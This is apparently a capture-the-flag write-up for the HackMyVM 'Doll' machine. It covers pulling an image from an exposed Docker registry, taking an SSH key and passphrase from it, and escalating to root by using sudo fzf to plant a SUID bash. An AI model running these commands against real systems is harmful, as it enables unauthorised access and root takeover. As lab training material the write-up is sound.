# URL
https://hackmyvm.eu/machines/machine.php?vm=Doll
# Concept
* arbitrary Docker registry container pulls
* Docker container history enumeration
* sudo fzf command execution
# Method of solve
## Starting Scans
* the system has two ports exposed, `22` and `1007`
* `1007` is a Docker registry API
* we navigate to the following endpoint on the Docker registry to find what containers it is hosting:
`http://192.168.212.31:1007/v2/_catalog`
* we see that there is a container named `dolly`
* we can use Docker commands to pull the container:
```
docker pull "192.168.212.31:1007/dolly:latest"
```
* this server is not HTTPS, so we have to edit a Docker config file to accept the server as an insecure one:
* add the following to the `/etc/docker/daemon.json` file
```
{
  "insecure-registries": ["192.168.212.31:1007"]
}
```
* after this, we need to restart the daemon and Docker:
```
systemctl daemon-reload
systemctl restart docker
``` 
* we get the name of the Docker container:
```
docker image ls
```
* we enter the container with a shell as root:
```
docker run -it 192.168.212.31:1007/dolly ash
```
## Initial Access
* from here we want to enumerate users
```
cd /home
```
* we see that there is a `bela` user
* in her home directory there is an SSH private key
* copy the key to our own attacker machine, call it `id_rsa` and change its permissions
```
chmod 600 id_rsa
```
* when we try to use it login via SSH, we find out it is passphrase protected
* we don't know what the passphrase is, but we can see if the Docker container has any clues in its logs history:
```
docker image history "192.168.212.31:1007/dolly"
```
* so we get the passphase from there and we are able to login directed to the box as the `bela` user
## Privilege Escalation
* this user has sudo permissions with the `fzf` program:
```
sudo -l
```
* this program has an entry on the GFTObins website:
```
https://gtfobins.org/gtfobins/fzf/
```
* so we have to run the sudo command from one terminal, and run the malicious commands from another localhost terminal
```
sudo /usr/bin/fzf --listen\=1337
```
* and run the following command on another terminal to create an SUID binary of the `bash` shell command:
```
curl http://localhost:1337 -d 'execute(cp /usr/bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash)'
```
* from there, just access the `rootbash` command to become root:
```
/tmp/rootbash -p
```
* done like dinner :D
